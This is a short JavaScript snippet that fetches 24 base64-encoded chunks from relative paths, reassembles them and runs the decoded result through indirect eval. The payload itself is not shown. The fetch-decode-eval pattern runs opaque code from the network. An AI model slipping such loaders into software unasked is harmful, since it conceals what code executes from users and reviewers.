(async function(){
  try{
    const n=24;
    const parts=await Promise.all(Array.from({length:n},(_,i)=>fetch('h'+i+'.b64?v=13',{cache:'no-store'}).then(r=>{
      if(!r.ok)throw new Error('h'+i);
      return r.text();
    }));
    const code=new TextDecoder().decode(Uint8Array.from(atob(parts.join('').replace(/\s+/g,'')),c=>c.charCodeAt(0)));
    (0,eval)(code);
  }catch(e){console.error('cloud',e)}
})();
